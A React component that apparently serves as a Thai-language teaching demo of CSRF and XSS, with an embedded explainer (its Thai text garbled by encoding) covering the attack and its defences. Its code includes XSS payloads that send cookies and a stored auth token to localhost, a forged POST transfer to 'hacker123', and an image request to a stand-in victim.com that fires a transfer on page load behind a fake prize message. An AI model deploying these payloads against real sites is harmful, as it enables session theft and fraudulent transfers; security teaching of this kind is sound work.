import { useEffect, useState } from "react";

function CSRF() {


    const [isOpen, setIsOpen] = useState(false);
    useEffect(() => {
        // set the cookie
        document.cookie = "session=12345";
        localStorage.setItem("auth_token", "12345");
    }, []);
    const userInput2 = '<img src="invalid.jpg" onerror="document.location=\'http://localhost:3001?cookie=\'+document.cookie">';

    const userInput3 = `<img src="invalid.jpg" onerror="
    fetch('http://localhost:3001', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + localStorage.getItem('auth_token') // ‡∏î‡∏∂‡∏á‡∏Ñ‡πà‡∏≤ auth_token ‡∏à‡∏≤‡∏Å localStorage
        },
        credentials: 'include', // ‡∏™‡πà‡∏á Cookie ‡∏Ç‡∏≠‡∏á‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡πÑ‡∏õ‡∏î‡πâ‡∏ß‡∏¢
        body: JSON.stringify({ toAccount: 'hacker123', amount: 5000 })
    });
    ">
`;

    const handleHack = () => {
        setIsOpen(true);
    }

    const token = localStorage.getItem("auth_token");

    const handleCsrf = () => {
        // fecth the url with the cookie
        fetch("http://localhost:3001", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${token}`,
            },
            credentials: "include", // ‡∏™‡πà‡∏á Cookie ‡∏Ç‡∏≠‡∏á‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡πÑ‡∏õ‡∏î‡πâ‡∏ß‡∏¢
            body: JSON.stringify({ toAccount: "hacker123", amount: 5000 }),
        });
    }

    const textRead = `
     <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    
      margin: 0;
      padding: 2rem;
    }
    .container {
      max-width: 800px;
      margin: auto;
    
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }
    h1 {
      color: #d6336c;
      font-size: 1.8rem;
    }
    p {
      margin-bottom: 1rem;
    }
    ul {
      padding-left: 1.5rem;
      margin-bottom: 1rem;
    }
    li {
      margin-bottom: 0.5rem;
    }
    code {
      
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 0.95rem;
    }
    .highlight {
      color: #0d6efd;
      font-weight: bold;
    }
  </style>
    <div class="container">
    <h1>CSRF (Cross-Site Request Forgery) ‡∏Ñ‡∏∑‡∏≠‡∏≠‡∏∞‡πÑ‡∏£?</h1>
    <p>
      <strong>CSRF</strong> (‡∏≠‡πà‡∏≤‡∏ô‡∏ß‡πà‡∏≤ ‚Äú‡∏ã‡∏µ‡πÄ‡∏≠‡∏™‡∏≠‡∏≤‡∏£‡πå‡πÄ‡∏≠‡∏ü‚Äù) ‡∏Ñ‡∏∑‡∏≠‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏î‡πâ‡∏≤‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢‡∏Ç‡∏≠‡∏á‡πÄ‡∏ß‡πá‡∏ö‡πÅ‡∏≠‡∏õ‡∏û‡∏•‡∏¥‡πÄ‡∏Ñ‡∏ä‡∏±‡∏ô
      ‡∏ó‡∏µ‡πà‡∏ú‡∏π‡πâ‡πÑ‡∏°‡πà‡∏´‡∏ß‡∏±‡∏á‡∏î‡∏µ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ <span class="highlight">‚Äú‡∏´‡∏•‡∏≠‡∏Å‡πÉ‡∏´‡πâ‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏™‡πà‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‚Äù</span> ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏£‡∏∞‡∏ö‡∏ö
      ‡πÇ‡∏î‡∏¢‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡∏£‡∏π‡πâ‡∏ï‡∏±‡∏ß‡∏ß‡πà‡∏≤‡πÑ‡∏î‡πâ‡∏™‡πà‡∏á request ‡∏ô‡∏±‡πâ‡∏ô‡∏à‡∏£‡∏¥‡∏á ‡πÜ
    </p>

    <p>‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÄ‡∏ä‡πà‡∏ô:</p>
    <ul>
      <li>‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡πÉ‡∏ô‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£</li>
      <li>‡∏à‡∏≤‡∏Å‡∏ô‡∏±‡πâ‡∏ô‡πÄ‡∏õ‡∏¥‡∏î‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏õ‡∏•‡∏≠‡∏°‡∏ó‡∏µ‡πà‡πÅ‡∏ù‡∏á‡πÇ‡∏Ñ‡πâ‡∏î‡πÑ‡∏ß‡πâ ‡πÄ‡∏ä‡πà‡∏ô <code>&lt;img src="https://mybank.com/transfer?to=hacker&amp;amount=5000"&gt;</code></li>
      <li>‡∏´‡∏≤‡∏Å‡∏£‡∏∞‡∏ö‡∏ö‡∏ò‡∏ô‡∏≤‡∏Ñ‡∏≤‡∏£‡πÑ‡∏°‡πà‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô CSRF ‚Üí ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÇ‡∏≠‡∏ô‡πÄ‡∏á‡∏¥‡∏ô‡∏à‡∏∞‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡∏∂‡πâ‡∏ô‡∏ó‡∏±‡∏ô‡∏ó‡∏µ</li>
    </ul>

    <p>‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡πÅ‡∏Æ‡∏Å‡πÄ‡∏Å‡∏≠‡∏£‡πå‡∏≠‡∏≤‡∏à‡∏ó‡∏≥‡πÑ‡∏î‡πâ‡∏à‡∏≤‡∏Å CSRF:</p>
    <ul>
      <li>‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡∏Ç‡∏≠‡∏á‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠</li>
      <li>‡πÇ‡∏û‡∏™‡∏ï‡πå‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÇ‡∏î‡∏¢‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠</li>
      <li>‡πÇ‡∏≠‡∏ô‡πÄ‡∏á‡∏¥‡∏ô / ‡∏•‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•</li>
    </ul>

    <p><strong>‡∏ß‡∏¥‡∏ò‡∏µ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô CSRF:</strong></p>
    <ul>
      <li>‡πÉ‡∏ä‡πâ <span class="highlight">CSRF Token</span> ‡πÉ‡∏ô‡∏ó‡∏∏‡∏Å form ‡∏´‡∏£‡∏∑‡∏≠ request ‡∏ó‡∏µ‡πà‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç</li>
      <li>‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ cookie ‡πÅ‡∏ö‡∏ö <code>SameSite=Strict</code></li>
      <li>‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö <code>Origin</code> ‡∏´‡∏£‡∏∑‡∏≠ <code>Referer</code> header</li>
      <li>‡πÉ‡∏ä‡πâ OTP ‡∏´‡∏£‡∏∑‡∏≠ CAPTCHA ‡∏Å‡∏±‡∏ö‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç</li>
    </ul>

    <p><strong>‡∏™‡∏£‡∏∏‡∏õ:</strong> CSRF ‡∏Ñ‡∏∑‡∏≠‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏ó‡∏µ‡πà‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏™‡πà‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏≠‡∏±‡∏ô‡∏ï‡∏£‡∏≤‡∏¢‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡∏ï‡∏±‡πâ‡∏á‡πÉ‡∏à‡∏ú‡πà‡∏≤‡∏ô session ‡∏ó‡∏µ‡πà‡∏¢‡∏±‡∏á‡∏Ñ‡∏á‡∏≠‡∏¢‡∏π‡πà</p>
  </div>`;


    useEffect(() => {
        // ‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÅ‡∏ö‡∏ö GET Request ‡πÇ‡∏î‡∏¢‡πÅ‡∏ù‡∏á‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á‡∏Ñ‡∏≥‡∏Ç‡∏≠‡∏ú‡πà‡∏≤‡∏ô <img>
        const attackUrl = "https://victim.com/transfer?to=hacker&amount=5000";
        const img = new Image();
        img.src = attackUrl; // ‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏ó‡∏µ‡πà‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡πÅ‡∏•‡πâ‡∏ß request ‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå
    }, []);

    return (
        <>
            <div dangerouslySetInnerHTML={{ __html: textRead }}></div>
            {/* <div dangerouslySetInnerHTML={{ __html: userInput2 }} /> */}
            {/* <div dangerouslySetInnerHTML={{ __html: userInput3 }} /> */}
            <div style={{ justifyContent: "center", display: "flex", marginTop: "20%" }}>


                {/* {isOpen ? <div dangerouslySetInnerHTML={{ __html: userInput3 }} /> : <button onClick={handleHack}>Click me</button>} */}


                <h1>‡∏Ñ‡∏∏‡∏ì‡πÑ‡∏î‡πâ‡∏£‡∏±‡∏ö‡∏£‡∏≤‡∏á‡∏ß‡∏±‡∏•‡∏û‡∏¥‡πÄ‡∏®‡∏©! üéÅ</h1>
                <p>‡∏Å‡∏≥‡∏•‡∏±‡∏á‡πÇ‡∏´‡∏•‡∏î‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•...</p>
                <p>‡πÇ‡∏õ‡∏£‡∏î‡∏Ñ‡∏•‡∏¥‡∏Å‡∏ó‡∏µ‡πà‡∏•‡∏¥‡∏á‡∏Å‡πå‡∏ô‡∏µ‡πâ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏£‡∏±‡∏ö‡∏£‡∏≤‡∏á‡∏ß‡∏±‡∏•</p>
            </div>
        </>
    );
}

export default CSRF;
